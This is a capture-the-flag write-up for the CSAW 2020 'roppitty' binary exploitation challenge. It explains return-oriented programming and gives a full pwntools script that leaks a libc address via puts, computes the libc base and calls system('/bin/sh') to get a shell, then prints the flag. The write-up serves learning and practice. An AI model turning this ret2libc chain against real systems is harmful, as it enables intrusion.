# CSAW CTF QUALS 2020: Pwn: roppitty
</br>**Category:** Pwn/Binary exploitation **Points:** 50 points
</br></br>
**Description:**</br>
Welcome to pwn!
</br>

## Solution

The challenge gives us a binary (**rop**) and a libc (**libc-2.27.so**).

```
$ file rop
rop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5d177aa372f308c07c8daaddec53df7c5aafd630, not stripped
```

Now we know that the binary is an **ELF 64-bit LSB executable**, which means that it's architecture is 64-bit, is **dynamically linked**, it only fetched the libc for what it needs, making the binary smaller and is **not stripped**, so it has debugging information.

By the name of the challenge and the binary we can guess that we're gonna have to use the Return Oriented Programming (ROP) technique in order to exploit the binary.

ROP is a technique that executes machine instructions sequences (called "gadgets") that are in a subroutine within the program and/or shared libraries code, to gain control of the flow of the program. 

Let's run the binary and see what it does:
```
$ ./rop
Hello

```

It prints `Hello` ask for input and exits.

### Exploit

```python
from pwn import *

local = True
debugging = False

context(arch='amd64', os='linux')
host, port = 'pwn.chal.csaw.io', 5016
binary = './rop'
elf = ELF(binary)
libc = ELF('./libc-2.27.so')

if local:
    p = process(binary)
else:
    p = remote(host, port)

def debug(bps):
    gdbscript = ''
    for bp in bps:
        gdbscript += 'b *0x{:x}'.format(bp)
    gdb.attach(p, gdbscript=gdbscript)

if debugging:
    debug([0x400611]) # 0x400611 vuln()'s ret instruction


# Find the length of padding
"""
p.recvline() # 'Hello'
payload = cyclic(1024)
p.sendline(payload)
"""
padding_len = cyclic_find('kaaa')

# Find libc's puts address by calling puts@plt with puts@got as it's argument and calling main so we can eploit the program again
p.recvline() # 'Hello'

padding = b'A' * padding_len
puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']
pop_rdi = 0x400683 # $ ROPgadget --binary ./rop | grep -i 'pop rdi'     ## So we can put puts@got in the rdi register to work as an argument for puts@plt
log.info('puts@plt starts at  ' + hex(puts_plt))
log.info('puts@GOT starts at  ' + hex(puts_got))
log.info('main starts at      ' + hex(main))
log.info('pop rdi; ret; is at ' + hex(pop_rdi))

payload = padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
p.sendline(payload)

puts_libc = p.recvline().strip()
puts_libc = u64(puts_libc.ljust(8, b'\x00'))

# Calculate libc base address, because libc only has the offsets of it's functions.
# So the true function's address will be libc base address + libc.symbols['function_name']
# if we assign an address to libc.address, it does those calculations immediately
libc.address = puts_libc - libc.symbols['puts']

# Call system('/bin/sh') to spawn a shell
p.recvline() # 'Hello'

system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))
log.info('system starts at  ' + hex(system))
log.info('/bin/sh starts at ' + hex(bin_sh))

# we do it twice to allign the stack
payload = padding + p64(pop_rdi) + p64(bin_sh) + p64(system) + p64(pop_rdi) + p64(bin_sh) + p64(system) 
p.sendline(payload)

p.interactive()
```

## Flag
>flag{r0p_4ft3r_r0p_4ft3R_r0p}

